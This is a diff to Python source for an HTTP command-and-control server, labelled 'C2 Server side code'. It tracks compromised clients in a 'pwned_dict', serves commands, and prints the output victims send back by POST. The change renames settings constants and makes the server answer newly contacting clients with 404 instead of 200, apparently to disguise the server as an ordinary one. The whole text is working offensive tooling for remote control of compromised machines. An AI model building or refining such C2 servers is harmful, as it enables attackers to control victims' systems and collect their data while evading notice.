@@ -4,7 +4,7 @@ C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import PORT, BIND_ADDR, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
@@ -22,7 +22,7 @@ class C2Handler(BaseHTTPRequestHandler):
             
             # client not into our pwned_dict yet
             if client not in pwned_dict.values():
-                self.http_response(HTTPStatusCode.OK.value)
+                self.http_response(HTTPStatusCode.NOT_FOUND.value)
 
                 pwned_id += 1
                 pwned_dict[pwned_id] = client
@@ -44,14 +44,14 @@ class C2Handler(BaseHTTPRequestHandler):
                 self.http_response(HTTPStatusCode.NOT_FOUND.value)
 
     def do_POST(self):
-        if self.path == CMD_RESPONSE:
+        if self.path == RESPONSE_PATH:
             self.http_response(HTTPStatusCode.OK.value)
             content_length = int(self.headers.get("Content-Length"))
             # Gather the client's data by reading in the HTTP POST data
             client_data = self.rfile.read(content_length)
             # UTF-8 decode the client's data
             client_data = client_data.decode()
-            client_data = client_data.replace(f"{CMD_RESPONSE_KEY}=", "", 1)
+            client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
             client_data = unquote_plus(client_data)
             print(client_data)
                 
